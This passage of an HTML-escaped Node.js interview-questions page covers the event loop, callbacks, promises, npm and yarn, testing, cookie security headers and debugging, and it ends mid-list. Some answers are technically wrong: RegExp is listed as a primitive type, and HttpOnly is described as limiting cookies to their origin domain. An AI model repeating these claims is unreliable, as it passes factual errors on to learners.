href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-how-to-implement-memcached-in-nodejs&quot;&gt;How to Implement Memcached in Nodejs?&lt;/a&gt;| | 77. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-explain-error-handling-in-nodejs&quot;&gt;Explain Error Handling in Nodejs?&lt;/a&gt;| | 78. |&lt;a href=&quot;https://raw.githubusercontent.com/learning-zone/nodejs-interview-questions/master/#q-how-to-generate-and-verify-checksum-of-the-given-string-in-nodejs&quot;&gt;How to generate and verify checksum of the given string in Nodejs&lt;/a&gt;|&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What does the runtime environment mean in Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;The Node.js runtime is the software stack responsible for installing your web service&#39;s code and its dependencies and running your service.&lt;/p&gt; 
&lt;p&gt;The Node.js runtime for App Engine in the standard environment is declared in the &lt;code&gt;app.yaml&lt;/code&gt; file:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;runtime: nodejs10
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The runtime environment is literally just the environment your application is running in. This can be used to describe both the hardware and the software that is running your application. How much RAM, what version of node, what operating system, how much CPU cores, can all be referenced when talking about a runtime environment.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What is Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;Node.js is an open-source server side runtime environment built on Chrome&#39;s V8 JavaScript engine. It provides an event driven, non-blocking (asynchronous) I/O and cross-platform runtime environment for building highly scalable server-side applications using JavaScript.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What is Node.js Process Model?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;Node.js runs in a single process and the application code runs in a single thread and thereby needs less resources than other platforms. All the user requests to your web application will be handled by a single thread and all the I/O work or long running job is performed asynchronously for a particular request. So, this single thread doesn&#39;t have to wait for the request to complete and is free to handle the next request. When asynchronous I/O work completes then it processes the request further and sends the response.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What are the data types in Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;&lt;em&gt;Primitive Types&lt;/em&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;String&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Number&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Boolean&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Undefined&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Null&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;RegExp&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;code&gt;Buffer&lt;/code&gt;: Node.js includes an additional data type called Buffer (not available in browser&#39;s JavaScript). Buffer is mainly used to store binary data, while reading from a file or receiving packets over the network.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;How to create a simple server in Node.js that returns Hello World?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;Step 01&lt;/strong&gt;: Create a project directory&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mkdir myapp
cd myapp
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Step 02&lt;/strong&gt;: Initialize project and link it to npm&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm init
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This creates a &lt;code&gt;package.json&lt;/code&gt; file in your myapp folder. The file contains references for all npm packages you have downloaded to your project. The command will prompt you to enter a number of things. You can enter your way through all of them EXCEPT this one:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;entry point: (index.js)
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Rename this to:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;app.js
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Step 03&lt;/strong&gt;: Install Express in the myapp directory&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm install express --save
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Step 04&lt;/strong&gt;: app.js&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;var express = require(&#39;express&#39;);
var app = express();
app.get(&#39;/&#39;, function (req, res) {
  res.send(&#39;Hello World!&#39;);
});

app.listen(3000, function () {
  console.log(&#39;Example app listening on port 3000!&#39;);
});
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Step 05&lt;/strong&gt;: Run the app&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bah&quot;&gt;node app.js
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;How do Node.js works?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;Node is completely event-driven. Basically the server consists of one thread processing one event after another.&lt;/p&gt; 
&lt;p&gt;A new request coming in is one kind of event. The server starts processing it and when there is a blocking IO operation, it does not wait until it completes and instead registers a callback function. The server then immediately starts to process another event (maybe another request). When the IO operation is finished, that is another kind of event, and the server will process it (i.e. continue working on the request) by executing the callback as soon as it has time.&lt;/p&gt; 
&lt;p&gt;So the server never needs to create additional threads or switch between threads, which means it has very little overhead. If you want to make full use of multiple hardware cores, you just start multiple instances of node.js&lt;/p&gt; 
&lt;p&gt;Node JS Platform does not follow Request/Response Multi-Threaded Stateless Model. It follows Single Threaded with Event Loop Model. Node JS Processing model mainly based on Javascript Event based model with Javascript callback mechanism.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Single Threaded Event Loop Model Processing Steps:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Clients Send request to Web Server.&lt;/li&gt; 
 &lt;li&gt;Node JS Web Server internally maintains a Limited Thread pool to provide services to the Client Requests.&lt;/li&gt; 
 &lt;li&gt;Node JS Web Server receives those requests and places them into a Queue. It is known as ‚ÄúEvent Queue‚Äù.&lt;/li&gt; 
 &lt;li&gt;Node JS Web Server internally has a Component, known as ‚ÄúEvent Loop‚Äù. Why it got this name is that it uses indefinite loop to receive requests and process them.&lt;/li&gt; 
 &lt;li&gt;Event Loop uses Single Thread only. It is main heart of Node JS Platform Processing Model.&lt;/li&gt; 
 &lt;li&gt;Even Loop checks any Client Request is placed in Event Queue. If no, then wait for incoming requests for indefinitely.&lt;/li&gt; 
 &lt;li&gt;If yes, then pick up one Client Request from Event Queue 
  &lt;ul&gt; 
   &lt;li&gt;Starts process that Client Request&lt;/li&gt; 
   &lt;li&gt;If that Client Request Does Not requires any Blocking IO Operations, then process everything, prepare response and send it back to client.&lt;/li&gt; 
   &lt;li&gt;If that Client Request requires some Blocking IO Operations like interacting with Database, File System, External Services then it will follow different approach 
    &lt;ul&gt; 
     &lt;li&gt;Checks Threads availability from Internal Thread Pool&lt;/li&gt; 
     &lt;li&gt;Picks up one Thread and assign this Client Request to that thread.&lt;/li&gt; 
     &lt;li&gt;That Thread is responsible for taking that request, process it, perform Blocking IO operations, prepare response and send it back to the Event Loop&lt;/li&gt; 
     &lt;li&gt;Event Loop in turn, sends that Response to the respective Client.&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What is an error-first callback?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;The pattern used across all the asynchronous methods in Node.js is called &lt;em&gt;Error-first Callback&lt;/em&gt;. Here is an example:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;fs.readFile( &quot;file.json&quot;, function ( err, data ) {
  if ( err ) {
    console.error( err );
  }
  console.log( data );
});
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Any asynchronous method expects one of the arguments to be a callback. The full callback argument list depends on the caller method, but the first argument is always an error object or null. When we go for the asynchronous method, an exception thrown during function execution cannot be detected in a try/catch statement. The event happens after the JavaScript engine leaves the try block.&lt;/p&gt; 
&lt;p&gt;In the preceding example, if any exception is thrown during the reading of the file, it lands on the callback function as the first and mandatory parameter.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What is callback hell in Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;&lt;code&gt;Callback hell&lt;/code&gt; is a phenomenon that afflicts a JavaScript developer when he tries to execute multiple asynchronous operations one after the other.&lt;/p&gt; 
&lt;p&gt;An asynchronous function is one where some external activity must complete before a result can be processed; it is ‚Äúasynchronous‚Äù in the sense that there is an unpredictable amount of time before a result becomes available. Such functions require a callback function to handle errors and process the result.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;getData(function(a){
    getMoreData(a, function(b){
        getMoreData(b, function(c){ 
            getMoreData(c, function(d){ 
	            getMoreData(d, function(e){ 
		            ...
		        });
	        });
        });
    });
});
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Techniques for avoiding callback hell&lt;/strong&gt;&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Using Async.js&lt;/li&gt; 
 &lt;li&gt;Using Promises&lt;/li&gt; 
 &lt;li&gt;Using Async-Await&lt;/li&gt; 
&lt;/ol&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Managing callbacks using Async.js&lt;/strong&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;code&gt;Async&lt;/code&gt; is a really powerful npm module for managing asynchronous nature of JavaScript. Along with Node.js, it also works for JavaScript written for browsers.&lt;/p&gt; 
&lt;p&gt;Async provides lots of powerful utilities to work with asynchronous processes under different scenarios.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm install --save async
&lt;/code&gt;&lt;/pre&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;ASYNC WATERFALL&lt;/strong&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;var async = require(&#39;async&#39;);
async.waterfall([
    function(callback) {
        //doSomething
        callback(null, paramx); //paramx will be availaible as the first parameter to the next function
        /**
            The 1st parameter passed in callback.
            @null or @undefined or @false control moves to the next function
            in the array
            if @true or @string the control is immedeatly moved
            to the final callback fucntion
            rest of the functions in the array
            would not be executed
        */
    },
    function(arg1, callback) {
        //doSomething else
      // arg1 now equals paramx
        callback(null, result);
    },
    function(arg1, callback) {
        //do More
        // arg1 now equals &#39;result&#39;
        callback(null, &#39;done&#39;);
    },
    function(arg1, callback) {
        //even more
        // arg1 now equals &#39;done&#39;
        callback(null, &#39;done&#39;);
    }
], function (err, result) {
    //final callback function
    //finally do something when all function are done.
    // result now equals &#39;done&#39;
});
&lt;/code&gt;&lt;/pre&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;ASYNC SERIES&lt;/strong&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;var async = require(&#39;async&#39;);
async.series([
    function(callback){
        // do some stuff ...
        callback(null, &#39;one&#39;);
        /**
            The 1st parameter passed in callback.
            @null or @undefined or @false control moves to the next function
            in the array
            if @true or @string the control is immedeatly moved
            to the final callback fucntion with the value of err same as
            passed over here and
            rest of the functions in the array
            would not be executed
        */
    },
    function(callback){
        // do some more stuff ...
        callback(null, &#39;two&#39;);
    }
],
// optional callback
function(err, results){
    // results is now equal to [&#39;one&#39;, &#39;two&#39;]
});
&lt;/code&gt;&lt;/pre&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Managing callbacks hell using promises&lt;/strong&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Promises are alternative to callbacks while dealing with asynchronous code. Promises return the value of the result or an error exception. The core of the promises is the &lt;code&gt;.then()&lt;/code&gt; function, which waits for the promise object to be returned. The &lt;code&gt;.then()&lt;/code&gt; function takes two optional functions as arguments and depending on the state of the promise only one will ever be called. The first function is called when the promise if fulfilled (A successful result). The second function is called when the promise is rejected.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;var outputPromise = getInputPromise().then(function (input) {
    //handle success
}, function (error) {
    //handle error
});
&lt;/code&gt;&lt;/pre&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Using Async Await&lt;/strong&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Async await makes asynchronous code look like it\‚Äôs synchronous. This has only been possible because of the reintroduction of promises into node.js. Async-Await only works with functions that return a promise.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const getrandomnumber = function(){
    return new Promise((resolve, reject)=&amp;gt;{
        setTimeout(() =&amp;gt; {
            resolve(Math.floor(Math.random() * 20));
        }, 1000);
    });
}

const addRandomNumber = async function(){
    const sum = await getrandomnumber() + await getrandomnumber();
    console.log(sum);
}

addRandomNumber();
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What are Promises in Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;It allows to associate handlers to an asynchronous action&#39;s eventual success value or failure reason. This lets asynchronous methods return values like synchronous methods: instead of the final value, the asynchronous method returns a promise for the value at some point in the future.&lt;/p&gt; 
&lt;p&gt;Promises in node.js promised to do some work and then had separate callbacks that would be executed for success and failure as well as handling timeouts. Another way to think of promises in node.js was that they were emitters that could emit only two events: success and error.The cool thing about promises is you can combine them into dependency chains (do Promise C only when Promise A and Promise B complete).&lt;/p&gt; 
&lt;p&gt;The core idea behind promises is that a promise represents the result of an asynchronous operation. A promise is in one of three different states:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;pending - The initial state of a promise.&lt;/li&gt; 
 &lt;li&gt;fulfilled - The state of a promise representing a successful operation.&lt;/li&gt; 
 &lt;li&gt;rejected - The state of a promise representing a failed operation. Once a promise is fulfilled or rejected, it is immutable (i.e. it can never change again).&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Creating a Promise&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;var myPromise = new Promise(function(resolve, reject){
   ....
})
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What tools can be used to assure consistent style?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;ESLint&lt;/li&gt; 
 &lt;li&gt;Standard&lt;/li&gt; 
&lt;/ul&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;When should you npm and when yarn?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;npm&lt;/strong&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;It is the default method for managing packages in the Node.js runtime environment. It relies upon a command line client and a database made up of public and premium packages known as the the npm registry. Users can access the registry via the client and browse the many packages available through the npm website. Both npm and its registry are managed by npm, Inc.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;node -v
npm -v
&lt;/code&gt;&lt;/pre&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Yarn&lt;/strong&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Yarn was developed by Facebook in attempt to resolve some of npm‚Äôs shortcomings. Yarn isn‚Äôt technically a replacement for npm since it relies on modules from the npm registry. Think of Yarn as a new installer that still relies upon the same npm structure. The registry itself hasn‚Äôt changed, but the installation method is different. Since Yarn gives you access to the same packages as npm, moving from npm to Yarn doesn‚Äôt require you to make any changes to your workflow.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm install yarn --global
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Comparing Yarn vs npm&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Fast: Yarn caches every package it downloads so it never needs to again. It also parallelizes operations to maximize resource utilization so install times are faster than ever.&lt;/li&gt; 
 &lt;li&gt;Reliable: Using a detailed, but concise, lockfile format, and a deterministic algorithm for installs, Yarn is able to guarantee that an install that worked on one system will work exactly the same way on any other system.&lt;/li&gt; 
 &lt;li&gt;Secure: Yarn uses checksums to verify the integrity of every installed package before its code is executed.&lt;/li&gt; 
 &lt;li&gt;Offline Mode: If you&#39;ve installed a package before, you can install it again without any internet connection.&lt;/li&gt; 
 &lt;li&gt;Deterministic: The same dependencies will be installed the same exact way across every machine regardless of install order.&lt;/li&gt; 
 &lt;li&gt;Network Performance: Yarn efficiently queues up requests and avoids request waterfalls in order to maximize network utilization.&lt;/li&gt; 
 &lt;li&gt;Multiple Registries: Install any package from either npm or Bower and keep your package workflow the same.&lt;/li&gt; 
 &lt;li&gt;Network Resilience: A single request failing won&#39;t cause an install to fail. Requests are retried upon failure.&lt;/li&gt; 
 &lt;li&gt;Flat Mode: Resolve mismatching versions of dependencies to a single version to avoid creating duplicates.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What is a stub?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;Stubbing and verification for node.js tests. Enables you to validate and override behaviour of nested pieces of code such as methods, require() and npm modules or even instances of classes. This library is inspired on node-gently, MockJS and mock-require.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Features of Stub:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Produces simple, lightweight Objects capable of extending down their tree&lt;/li&gt; 
 &lt;li&gt;Compatible with Nodejs&lt;/li&gt; 
 &lt;li&gt;Easily extendable directly or through an ExtensionManager&lt;/li&gt; 
 &lt;li&gt;Comes with predefined, usable extensions&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Stubs are functions/programs that simulate the behaviours of components/modules. Stubs provide canned answers to function calls made during test cases. Also, you can assert on with what these stubs were called.&lt;/p&gt; 
&lt;p&gt;A use-case can be a file read, when you do not want to read an actual file:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;var fs = require(&#39;fs&#39;);

var readFileStub = sinon.stub(fs, &#39;readFile&#39;, function (path, cb) {  
  return cb(null, &#39;filecontent&#39;);
});

expect(readFileStub).to.be.called;  
readFileStub.restore();
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What is a test pyramid? How can you implement it when talking about HTTP APIs?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;The &quot;Test Pyramid&quot; is a metaphor that tells us to group software tests into buckets of different granularity. It also gives an idea of how many tests we should have in each of these groups. It shows which kinds of tests you should be looking for in the different levels of the pyramid and gives practical examples on how these can be implemented.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;Mike Cohn&#39;s original test pyramid consists of three layers that your test suite should consist of (bottom to top):&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Unit Tests&lt;/li&gt; 
 &lt;li&gt;Service Tests&lt;/li&gt; 
 &lt;li&gt;User Interface Tests&lt;/li&gt; 
&lt;/ol&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;How can you secure your HTTP cookies against XSS attacks?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;1.&lt;/strong&gt; When the web server sets cookies, it can provide some additional attributes to make sure the cookies won&#39;t be accessible by using malicious JavaScript. One such attribute is HttpOnly.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;Set-Cookie: [name]=[value]; HttpOnly
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;HttpOnly makes sure the cookies will be submitted only to the domain they originated from.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;2.&lt;/strong&gt; The &quot;Secure&quot; attribute can make sure the cookies are sent over secured channel only.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;Set-Cookie: [name]=[value]; Secure
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;3.&lt;/strong&gt; The web server can use X-XSS-Protection response header to make sure pages do not load when they detect reflected cross-site scripting (XSS) attacks.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;X-XSS-Protection: 1; mode=block
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;4.&lt;/strong&gt; The web server can use HTTP Content-Security-Policy response header to control what resources a user agent is allowed to load for a certain page. It can help to prevent various types of attacks like Cross Site Scripting (XSS) and data injection attacks.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;Content-Security-Policy: default-src &#39;self&#39; *.http://sometrustedwebsite.com
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;How can you make sure your dependencies are safe?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;The only option is to automate the update / security audit of your dependencies. For that there are free and paid options:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;npm outdated&lt;/li&gt; 
 &lt;li&gt;Trace by RisingStack&lt;/li&gt; 
 &lt;li&gt;NSP&lt;/li&gt; 
 &lt;li&gt;GreenKeeper&lt;/li&gt; 
 &lt;li&gt;Snyk&lt;/li&gt; 
 &lt;li&gt;npm audit&lt;/li&gt; 
 &lt;li&gt;npm audit fix&lt;/li&gt; 
&lt;/ol&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What is Event loop in Node.js? And How does it work?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;The event loop is what allows Node.js to perform non-blocking I/O operations ‚Äî despite the fact that JavaScript is single-threaded ‚Äî by offloading operations to the system kernel whenever possible.&lt;/p&gt; 
&lt;p&gt;Node.js is a single-threaded application, but it can support concurrency via the concept of &lt;code&gt;event&lt;/code&gt; and &lt;code&gt;callbacks&lt;/code&gt;. Every API of Node.js is asynchronous and being single-threaded, they use &lt;code&gt;async function calls&lt;/code&gt; to maintain concurrency. Node uses observer pattern. Node thread keeps an event loop and whenever a task gets completed, it fires the corresponding event which signals the event-listener function to execute.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Event-Driven Programming&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;In an event-driven application, there is generally a main loop that listens for events, and then triggers a callback function when one of those events is detected.&lt;/p&gt; 
&lt;p&gt;Although events look quite similar to callbacks, the difference lies in the fact that callback functions are called when an asynchronous function returns its result, whereas event handling works on the observer pattern. The functions that listen to events act as Observers. Whenever an event gets fired, its listener function starts executing. Node.js has multiple in-built events available through events module and EventEmitter class which are used to bind events and event-listeners as follows&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;// Import events module
var events = require(&#39;events&#39;);

// Create an eventEmitter object
var eventEmitter = new events.EventEmitter();
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;em&gt;Example&lt;/em&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;// Import events module
var events = require(&#39;events&#39;);

// Create an eventEmitter object
var eventEmitter = new events.EventEmitter();

// Create an event handler as follows
var connectHandler = function connected() {
   console.log(&#39;connection succesful.&#39;);
  
   // Fire the data_received event 
   eventEmitter.emit(&#39;data_received&#39;);
}

// Bind the connection event with the handler
eventEmitter.on(&#39;connection&#39;, connectHandler);
 
// Bind the data_received event with the anonymous function
eventEmitter.on(&#39;data_received&#39;, function() {
   console.log(&#39;data received succesfully.&#39;);
});

// Fire the connection event 
eventEmitter.emit(&#39;connection&#39;);

console.log(&quot;Program Ended.&quot;);
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What is REPL? What purpose it is used for?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;REPL (READ, EVAL, PRINT, LOOP) is a computer environment similar to Shell (Unix/Linux) and command prompt. Node comes with the REPL environment when it is installed. System interacts with the user through outputs of commands/expressions used. It is useful in writing and debugging the codes. The work of REPL can be understood from its full form:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Read&lt;/strong&gt;: It reads the inputs from users and parses it into JavaScript data structure. It is then stored to memory.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Eval&lt;/strong&gt;: The parsed JavaScript data structure is evaluated for the results.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Print&lt;/strong&gt;: The result is printed after the evaluation.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Loop&lt;/strong&gt;: Loops the input command. To come out of NODE REPL, press ctrl+c twice&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Simple Expression&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;$ node
&amp;gt; 10 + 20
30
&amp;gt; 10 + ( 20 * 30 ) - 40
570
&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What is the difference between Asynchronous and Non-blocking?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;1. Asynchronous&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;The architecture of asynchronous explains that the message sent will not give the reply on immediate basis just like we send the mail but do not get the reply on an immediate basis. It does not have any dependency or order. Hence improving the system efficiency and performance. The server stores the information and when the action is done it will be notified.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;2. Non-Blocking&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Nonblocking immediately responses with whatever data available. Moreover, it does not block any execution and keeps on running as per the requests. If an answer could not be retrieved than in those cases API returns immediately with an error. Nonblocking is mostly used with I/O(input/output). Node.js is itself based on nonblocking I/O model. There are few ways of communication that a nonblocking I/O has completed. The callback function is to be called when the operation is completed. Nonblocking call uses the help of javascript which provides a callback function.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Asynchronous VS Non-Blocking&lt;/strong&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;ol&gt; 
 &lt;li&gt;Asynchronous does not respond immediately, While Nonblocking responds immediately if the data is available and if not that simply returns an error.&lt;/li&gt; 
 &lt;li&gt;Asynchronous improves the efficiency by doing the task fast as the response might come later, meanwhile, can do complete other tasks. Nonblocking does not block any execution and if the data is available it retrieves the information quickly.&lt;/li&gt; 
 &lt;li&gt;Asynchronous is the opposite of synchronous while nonblocking I/O is the opposite of blocking. They both are fairly similar but they are also different as asynchronous is used with a broader range of operations while nonblocking is mostly used with I/O.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;How to debug an application in Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;node-inspector&lt;/strong&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm install -g node-inspector
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Run&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;node-debug app.js
&lt;/code&gt;&lt;/pre&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Debugging&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Debugger&lt;/li&gt; 
   &lt;li&gt;Node Inspector&lt;/li&gt; 
